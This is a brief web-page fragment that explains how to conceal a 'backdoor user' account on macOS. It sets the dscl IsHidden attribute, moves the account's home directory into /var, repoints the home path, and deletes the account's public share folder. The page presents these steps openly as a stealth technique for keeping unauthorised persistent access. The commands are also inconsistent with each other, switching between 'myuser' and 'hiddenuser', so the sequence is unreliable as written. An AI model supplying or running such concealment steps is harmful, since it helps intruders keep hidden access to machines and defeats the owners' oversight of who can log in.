</head><body>HIDE USER : after creating your backdoor user, bear in mind that it can be seen on login screen and in preferences. to avoid this, you need to make your user hidden. use :<br/>
&gt; sudo dscl . create /Users/myuser IsHidden 1 <br/>
where myuser is your username<br/>
<br/>
if you later want to make it unhidden, just change the IsHidden value to 0. that is :<br/>
&gt; sudo dscl . create /Users/myuser IsHidden 0<br/>
<br/>
Donâ€™t forget that your home directory can be easily seen too, that is if u set it to default. move your directory to a directory that is not easily seen. lets say var/ directory.<br/>
&gt; sudo mv /Users/myuser /var/myuser<br/>
<br/>
the following command then updates the myuser directory to the new one /var/<br/>
&gt; sudo dscl . -create /Users/hiddenuser NFSHomeDirectory /var/hiddenuser<br/>
<br/>
this then removes the myuser public sharepoint folder<br/>
&gt; sudo dscl . -delete &quot;/SharePoints/myuser's Public Folder&quot;<br/>
